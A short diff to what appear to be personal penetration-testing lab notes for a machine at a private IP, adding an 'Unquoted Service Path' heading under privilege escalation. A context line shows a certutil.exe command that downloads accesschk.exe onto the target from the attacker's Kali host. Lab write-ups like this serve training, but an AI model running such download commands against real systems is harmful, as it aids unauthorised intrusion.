@@ -12,7 +12,7 @@ IP: 192.168.114.44
 
 
 # Resolution summary
-- Text
+- 
 - Text
 
 ## Improved skills
@@ -587,6 +587,7 @@ Enumerated top 200 UDP ports:
 ![](../Images/Pasted%20image%2020220708005834.png)
 
 ## Privilege Escalation vector
+## Unquoted Service Path
 
 #### - Typed "certutil.exe -urlcache -split -f "http://[Kali IP]:84/accesschk.exe" on target machine to download the accesschk binary
 
